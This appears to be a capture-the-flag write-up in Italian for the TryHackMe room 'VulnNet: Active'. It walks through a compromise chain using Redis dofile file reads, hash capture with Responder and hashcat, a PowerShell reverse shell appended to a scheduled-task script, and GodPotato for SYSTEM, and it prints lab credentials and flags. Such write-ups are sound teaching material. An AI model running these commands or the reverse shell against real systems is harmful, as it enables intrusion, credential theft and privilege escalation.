@@ -1,0 +1,262 @@
+Writeup — VulnNet: Active (TryHackMe)
+
+OS: Windows Server 2019 (Domain Controller, dominio vulnnet.local)
+Difficoltà: Medium
+Data: 11 settembre 2026
+
+---
+
+## Sommario
+
+Macchina Windows che è un Domain Controller ma non si comporta come tale: l'autore ha filtrato le porte classiche di un DC (Kerberos, LDAP, global catalog) lasciando la macchina attaccabile come se fosse un Windows standalone. Il full port scan rivela un Redis 2.8 esposto sulla 6379, servizio raro da trovare aperto e su cui sono arrivato per esclusione totale dopo aver scartato tutto il resto. Redis gira come l'utente enterprise-security e quella versione permette lettura di file arbitrari tramite dofile di Lua: sfruttandola si legge la user flag dal Desktop dell'utente. da lì, config set dir puntato a un path UNC verso la mia macchina forza Redis ad autenticarsi via SMB, l'hash NetNTLMv2 di enterprise-security viene catturato con Responder e crackato con hashcat (password sand_0873959498). con quelle credenziali si enumera una share SMB scrivibile, Enterprise-Share, che contiene uno script PowerShell eseguito periodicamente da uno scheduled task: appendendogli una reverse shell e ricaricandolo si ottiene una shell come enterprise-security. L'utente ha SeImpersonatePrivilege abilitato, quindi con GodPotato si impersona SYSTEM e si legge la system flag dal Desktop dell'Administrator
+
+Catena: nmap full port → Redis 6379 (per esclusione) → dofile lettura file arbitraria → user.txt → config set dir su path UNC → hash NetNTLMv2 su Responder → hashcat → sand_0873959498 → SMB share Enterprise-Share scrivibile → script .ps1 con scheduled task → reverse shell → shell enterprise-security → SeImpersonatePrivilege → GodPotato → SYSTEM → system.txt.
+
+---
+
+## strumenti e metodologie aggiuntive
+
+durante la sessione è stato utilizzato un llm: per recupero dettagli su CVE, interpretazione di output grezzi, suggerimenti su vettori inesplorati in caso di blocco e spiegazione dettagliata di concetti tecnici. l'esecuzione e le scelte operative erano mie. il writeup è stato scritto da me e successivamente ripulito con lo stesso strumento.
+
+---
+
+## Premessa
+
+prima macchina Medium del percorso e si sente il salto di difficoltà rispetto alle Easy precedenti. la room è instabile come diverse altre di TryHackMe: la VM si è impuntata del tutto una volta a metà escalation, con SMB e Redis che smettevano di rispondere, costringendo a un riavvio della lab machine e a rifare la parte iniziale della catena (nuovo IP, nuovo hash da ricatturare, la password però resta la stessa).
+due punti mi hanno fatto perdere tempo per errori miei più che tecnici: ho intestardito a lungo sulla lettura via Redis anche quando era chiaro che la system flag non stava sotto enterprise-security, e più avanti ho premuto Ctrl+C dentro la reverse shell pensando interrompesse solo il comando, chiudendo invece il listener netcat e perdendo la sessione,un paio di volte. la reverse shell come ultimo tentativo l'ho chiesta esplicitamente all'llm: quando una macchina TryHackMe punta tutto su un unico servizio e non c'è più niente da esplorare, spesso la strada è investire tempo nel costruire una reverse shell semplice sul servizio, e anche qui ha funzionato. lo script della reverse shell l'ha generato l'llm.
+
+---
+
+## Fase 1 — Ricognizione
+
+la macchina blocca il ping, da qui il -Pn. serve anche sudo per il SYN scan:
+
+sudo nmap -sC -sV -p- -T4 -Pn -v -oN vulnnet_active.txt 10.112.187.155
+
+Risultato:
+
+53/tcp    open  domain        Simple DNS Plus
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+6379/tcp  open  redis         Redis key-value store 2.8.2402
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666-49698/tcp open  msrpc   Microsoft Windows RPC (varie porte dinamiche)
+
+Host script results:
+| smb2-security-mode: 3.1.1: Message signing enabled and required
+Service Info: OS: Windows
+
+l'analisi porta per porta, che è quella che conta più del vettore in sé:
+
+la 53 è DNS e in un ambiente Windows è quasi sempre integrato col DC, non salta all'occhio come vettore.
+la 135, la 139 e tutte le porte dinamiche dell'RPC (49666–49698) sono storicamente sature e poco utili da mie macchine precedenti, le escludo subito.
+la 464 è curiosa: espone kpasswd5?, un servizio che non conoscevo e non mi era mai capitato. cercando, è il servizio di cambio password di Kerberos, e la sua presenza insieme alla 53 è di fatto un indicatore quasi certo del ruolo di Domain Controller. nmap lo marca con ? perché non riesce a fare un fingerprint pulito del servizio.
+la 6379 è Redis, non lo avevo mai visto esposto: non conoscendolo, mi sono informato su cos'è (un database NoSQL in-memory usato come cache, store chiave-valore e message broker) e ho cercato online i comandi essenziali per interrogarlo.
+la 9389 è .NET Message Framing, tipica di Active Directory Web Services, altra conferma del ruolo DC.
+Service Info dice Windows, e SMB gira in versione 2 con dialetto 3.1.1, signing abilitato e richiesto.
+
+Redis l'ho trovato andando per esclusione totale: ogni servizio scartato, tolti gli sconosciuti, non aveva senso di essere percorso, e l'unico realmente anomalo e attaccabile su questa macchina era proprio Redis sulla 6379.
+
+---
+
+## Fase 2 — Enumerazione Redis
+
+non avendo mai lavorato con Redis, parto da info per capire con cosa ho a che fare:
+
+redis-cli -h 10.112.187.155 info
+
+l'output conferma redis_version 2.8.2402, os Windows, arch 64 bit, role master. una versione vecchia, il che è promettente. da qui interrogo la working directory dell'istanza, che dice sotto quale utente gira e dove può scrivere:
+
+redis-cli -h 10.112.187.155 config get dir
+
+1) "dir"
+2) "C:\Users\enterprise-security\Downloads\Redis-x64-2.8.2402"
+
+Redis quindi gira nel contesto dell'utente enterprise-security. questo è il nome utente su cui costruire tutto il resto
+
+---
+
+## Fase 3 — Lettura file arbitraria e user flag
+
+passando contesto, versione di Redis e la domanda sulle vulnerabilità note all'llm, emerge che Redis 2.8 ha Lua integrato e che eval esegue script server-side. dofile legge un file dal disco della vittima e ne interpreta il contenuto come Lua: se il file non è codice valido, l'errore Lua che ritorna stampa parte del contenuto, di fatto una primitiva di lettura file arbitraria.
+
+verifico prima su un file di sistema noto:
+
+redis-cli -h 10.112.187.155 eval "return dofile('C:\\Windows\\win.ini')" 0
+(error) ... win.ini:1: unexpected symbol near ';'
+
+funziona: interpreta il contenuto del file come Lua e lo sputa nell'errore. la task della room indica esplicitamente il percorso (Desktop\user.txt),quindi vado dritto lì senza tirare a indovinare:
+
+redis-cli -h 10.112.187.155 eval "return dofile('C:\\Users\\enterprise-security\\Desktop\\user.txt')" 0
+(error) ... user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e'
+
+qui mi sono bloccato un attimo: non capivo se malformed number fosse un output sbagliato o se quel 3eb1... andasse trasformato in qualche modo. provando la stringa sul sito, answer incorrect. il motivo è che dofile interpreta il contenuto come Lua e il prefisso THM{ fa scattare l'errore di sintassi che tronca l'output prima della parte numerica, lasciando visibile solo la parte esadecimale. ricomponendo il formato standard delle flag TryHackMe:
+
+user flag: THM{3eb176aee96432d5b100bc93580b291e}
+
+la stessa lettura sul Desktop di enterprise-security per system.txt dà No such file or directory: la system flag non sta sotto questo utente, quindi serve scalare.
+
+---
+
+## Fase 4 — Cattura hash via SMB e crack
+
+per la seconda flag serve un accesso interattivo, e la strada pulita è rubare le credenziali dell'utente di servizio. cercando online come forzare Redis ad autenticarsi e rubare le credenziali di un utente di servizio, la tecnica è puntare la working directory di Redis a un path UNC verso la mia macchina: nel tentativo di raggiungerlo, il servizio si autentica via SMB e manda l'hash.
+
+Responder scopre e avvelena richieste di risoluzione nomi (LLMNR, NBT-NS, MDNS) e ospita server fasulli (tra cui SMB) per catturare gli hash di autenticazione. era già presente sulla mia Kali, richiede sudo. lo lancio su tun0:
+
+sudo responder -I tun0
+
+resta in ascolto (Listening for events) come deve. in un secondo terminale forzo l'auth:
+
+redis-cli -h 10.112.187.155 -t 5 config set dir "\\192.168.134.214\share"
+(error) ERR Changing directory: Permission denied
+
+il config fallisce con Permission denied, ma il tentativo di raggiungere il path UNC scatta prima del rifiuto, e Responder intercetta l'hash:
+
+[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
+[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:...
+
+salvo l'hash su file e lo cracco con rockyou. la modalità NetNTLMv2 su hashcat è la 5600:
+
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+
+rockyou ci ha messo insolitamente tanto per un hash che poi cade a un quarto della wordlist. Status: Cracked, la password compare in fondo alla riga dell'hash dopo i due punti:
+
+enterprise-security::VULNNET:...:sand_0873959498
+
+credenziali: enterprise-security / sand_0873959498.
+
+---
+
+## Fase 5 — Enumerazione share SMB
+
+con le credenziali valide enumero le share. smbclient va in timeout al primo tentativo (comportamento ricorrente su questa macchina per tutta la sessione), netexec invece passa:
+
+netexec smb 10.112.187.155 -u 'enterprise-security' -p 'sand_0873959498' --shares
+
+Share            Permissions   Remark
+-----            -----------   ------
+ADMIN$                         Remote Admin
+C$                             Default share
+Enterprise-Share READ,WRITE
+IPC$             READ          Remote IPC
+NETLOGON         READ          Logon server share
+SYSVOL           READ          Logon server share
+
+quello che salta all'occhio è Enterprise-Share: è l'unica share con permesso WRITE. le due share amministrative (ADMIN$, C$) non riportano permessi, e le altre tre (IPC$, NETLOGON, SYSVOL) sono in sola lettura. faccio login sulla share Enterprise per vedere se contiene info utili o credenziali. netexec conferma anche dominio vulnnet.local, host VULNNET-BC3TCK1, Windows Server 2019 Build 17763.
+
+---
+
+## Fase 6 — Share scrivibile e scheduled task
+
+smbclient con -m SMB3 forzato si connette (la scansione iniziale riportava SMB dialetto 2/3.1.1, ma la negoziazione automatica di smbclient andava in timeout: imporre SMB3 salta il problema):
+
+smbclient //10.112.187.155/Enterprise-Share -U 'enterprise-security%sand_0873959498' -m SMB3
+
+smb: \> dir
+  PurgeIrrelevantData_1826.ps1        A       69  ...
+
+un solo file, uno script .ps1 (PowerShell). era l'unica pista e l'unica cosa visibile. lo scarico e lo leggo:
+
+smb: \> get PurgeIrrelevantData_1826.ps1
+
+rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
+
+lo script cancella file in una cartella pubblica. il nome col numero, la posizione in una share scrivibile e il fatto che ripulisca periodicamente una cartella indicano che gira in automatico via scheduled task a intervalli. se ci appendo una reverse shell e lo ricarico, quando il task riparte mi restituisce una shell come l'utente che lo esegue.
+
+---
+
+## Fase 7 — Reverse shell
+
+come ultimo tentativo chiedo all'llm di preparare una reverse shell PowerShell: in passato, su macchine TryHackMe che puntano tutto su un unico vettore, la piattaforma è fissata con le reverse shell sul servizio, e qui lo schema si ripete. lo script della reverse shell l'ha generato l'llm. lo appendo allo script esistente:
+
+echo '$client = New-Object System.Net.Sockets.TCPClient("192.168.134.214",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' >> PurgeIrrelevantData_1826.ps1
+
+metto netcat in ascolto:
+
+nc -lvnp 4444
+
+e ricarico lo script modificato sulla share, sovrascrivendo l'originale:
+
+smbclient //10.112.187.155/Enterprise-Share -U 'enterprise-security%sand_0873959498' -m SMB3 -c 'put PurgeIrrelevantData_1826.ps1'
+
+dopo un paio di minuti il task esegue e la shell arriva:
+
+connect to [192.168.134.214] from (UNKNOWN) ...
+PS C:\Users\enterprise-security\Downloads> whoami
+vulnnet\enterprise-security
+
+come previsto, quando non c'è più niente da esplorare su un servizio di punta di una macchina (Redis in questo caso), l'unica cosa da fare è investire tempo per costruire una shell con reverse shell semplici, e ha funzionato anche qui.
+
+qui la sessione si è complicata per errori miei: un paio di volte ho premuto Ctrl+C dentro la reverse shell credendo interrompesse solo il comando in esecuzione, chiudendo invece il listener netcat e perdendo la sessione. ogni volta ho dovuto rimettere nc in ascolto e ricaricare lo script per far ripartire il task. una volta la VM si è proprio piantata (SMB e Redis non rispondevano più), imponendo un riavvio della lab machine, un nuovo IP e una nuova cattura dell'hash su Responder, la password però era la stessa, niente da ricrackare.
+
+---
+
+## Fase 8 — Privilege escalation con GodPotato
+
+verifico i privilegi dell'utente:
+
+PS C:\Users\enterprise-security\Downloads> whoami /priv
+
+SeMachineAccountPrivilege     Disabled
+SeChangeNotifyPrivilege       Enabled
+SeImpersonatePrivilege        Enabled
+SeCreateGlobalPrivilege       Enabled
+SeIncreaseWorkingSetPrivilege Disabled
+
+SeImpersonatePrivilege è abilitato. non conoscevo questi privilegi nel dettaglio: cercando, SeImpersonatePrivilege permette a un processo di impersonare il contesto di sicurezza di un altro utente dopo l'autenticazione, ed è la base degli attacchi della famiglia Potato, che permettono a un account a bassi privilegi di arrivare a SYSTEM. la conferma che serve scalare è che un type diretto su C:\Users\Administrator\Desktop\system.txt come enterprise-security resta appeso senza restituire nulla, cioè accesso negato.
+
+GodPotato è lo strumento che sfrutta SeImpersonatePrivilege su Windows Server 2019: abusa del meccanismo DCOM/RPC per forzare un servizio privilegiato ad autenticarsi verso una named pipe controllata dall'attaccante, cattura il token di SYSTEM e lo impersona per eseguire un comando arbitrario in quel contesto. lo scarico sulla mia Kali e lo carico sulla macchina via la stessa share scrivibile:
+
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+smbclient //10.114.143.229/Enterprise-Share -U 'enterprise-security%sand_0873959498' -m SMB3 -c 'put GodPotato-NET4.exe'
+
+dalla reverse shell lo copio in locale e lo lancio direttamente sul file della system flag:
+
+copy \\10.114.143.229\Enterprise-Share\GodPotato-NET4.exe C:\Users\enterprise-security\Downloads\gp.exe
+.\gp.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"
+
+l'output mostra tutta la catena di impersonazione: parte come NT AUTHORITY\NETWORK SERVICE, trova il token di SYSTEM (PID 848), lo impersona e avvia il processo come NT AUTHORITY\SYSTEM, che legge la flag:
+
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2764
+THM{d540c0645975900e5bb9167aa431fc9b}
+
+system flag: THM{d540c0645975900e5bb9167aa431fc9b}
+
+---
+
+## Catena completa
+
+nmap full port → DNS, RPC saturi, kpasswd5 (464), Redis (6379), ADWS (9389)
+→ Redis scelto per esclusione totale, unico servizio anomalo e attaccabile
+→ config get dir → gira come enterprise-security
+→ dofile lettura file arbitraria via Lua → user.txt (THM tronca l'output nell'errore)
+→ system.txt non presente sotto l'utente → serve scalare
+→ config set dir su path UNC verso la mia macchina → auth SMB forzata
+→ Responder cattura hash NetNTLMv2 → hashcat -m 5600 → sand_0873959498
+→ netexec: share Enterprise-Share con permesso WRITE
+→ script PurgeIrrelevantData_1826.ps1 eseguito da scheduled task
+→ reverse shell appesa allo script → shell enterprise-security
+→ whoami /priv → SeImpersonatePrivilege abilitato
+→ GodPotato → impersonazione token SYSTEM → system.txt
+
+---
+
+## Lezioni apprese
+
+quando la task di una room indica esplicitamente un percorso (Desktop\user.txt, Desktop\system.txt) non è casualità: va usato come mappa diretta invece di enumerare a caso il filesystem, cosa che io ho fatto tardi intestardendomi sulla lettura via Redis anche quando era già chiaro che la system flag non stava sotto quell'utente.
+
+Ctrl+C dentro una reverse shell netcat non interrompe il comando remoto, chiude il listener e uccide la sessione. per fermare un comando appeso lato target senza perdere la shell servono altri accorgimenti, e in una sessione dove riottenere la shell costa minuti (dipende da uno scheduled task) questo errore pesa parecchio.
+
+un servizio raro ed esposto come Redis vale sempre più della miriade di porte RPC/SMB standard: ragionare per esclusione, scartando i servizi saturi e concentrandosi sull'unico anomalo, ha portato dritto al vettore senza disperdere tempo.
+
+SeImpersonatePrivilege su un account a bassi privilegi è di fatto una scalata a SYSTEM già pronta: la sua sola presenza in whoami /priv, su Windows Server, indirizza immediatamente verso un attacco Potato senza bisogno di cercare altri vettori di escalation
+
+---
+
+## Tool utilizzati
+
+nmap, redis-cli, Responder, hashcat (-m 5600 NetNTLMv2), netexec (smb --shares, winrm), smbclient (-m SMB3), netcat, GodPotato (V1.20, GodPotato-NET4.exe), PowerShell (reverse shell)
